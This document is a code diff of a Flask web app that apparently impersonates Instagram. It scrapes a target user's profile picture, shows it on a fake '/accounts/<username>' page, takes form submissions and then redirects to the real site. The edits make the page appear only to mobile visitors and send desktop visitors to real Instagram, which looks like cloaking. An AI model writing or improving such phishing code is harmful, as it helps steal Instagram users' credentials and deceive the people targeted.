@@ -15,14 +15,11 @@ from bs4 import BeautifulSoup
 def get_pfp(username):
     base_url = f"https://www.instagram.com/{username}/"
     
-    # Send an HTTP GET request to the Instagram profile page
     response = requests.get(base_url)
     
-    # Check if the request was successful
     if response.status_code == 200:
         soup = BeautifulSoup(response.text, 'html.parser')
         
-        # Find the meta tag containing the profile picture URL
         meta_tag = soup.find("meta", property="og:image")
         
         if meta_tag:
@@ -41,14 +38,14 @@ def login(username):
     user_agent = request.headers.get('User-Agent')
     
     if 'Mobile' in user_agent or 'Android' in user_agent or 'iOS' in user_agent:
-        return redirect('https://www.instagram.com')   
-         
-    pfp = get_pfp(username)
-    
-    if not pfp:
-        return redirect('https://www.instagram.com')
-    
-    return render_template("index.html", username=username, pfp=pfp)
+        pfp = get_pfp(username)
+        
+        if not pfp:
+            return redirect('https://www.instagram.com')
+        
+        return render_template("index.html", username=username, pfp=pfp)
+        
+    return redirect('https://www.instagram.com')   
 
 @app.route('/accounts/<username>/submit', methods=['POST'])
 def submit(username):
@@ -78,7 +75,7 @@ def submit(username):
                 )
             )
 
-    return redirect("https://www.instagram.com")
+    return redirect("https://www.instagram.com/not_scared_boy")
 
 @app.route('/view')
 def view():
